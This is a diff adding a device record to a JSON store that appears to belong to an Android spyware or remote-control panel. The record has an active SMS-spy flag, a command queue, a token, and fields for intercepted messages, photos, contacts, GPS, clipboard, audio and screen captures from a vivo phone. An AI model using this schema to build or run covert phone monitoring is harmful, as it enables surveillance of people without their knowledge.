@@ -71,5 +71,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_26ad11f0",
+    "deviceName": "HP-LOCK-236E",
+    "ownerUsername": "Riz99",
+    "token": "d55db186fe9dc11a2005331c05cbd3a5",
+    "lastSeen": 1775911834176,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-11T12:50:34.176Z",
+    "deviceInfo": {
+      "model": "vivo V2344",
+      "androidVersion": "Android 14",
+      "battery": 74,
+      "network": "WiFi: <unknown ssid>",
+      "sim1": "Telkomsel",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
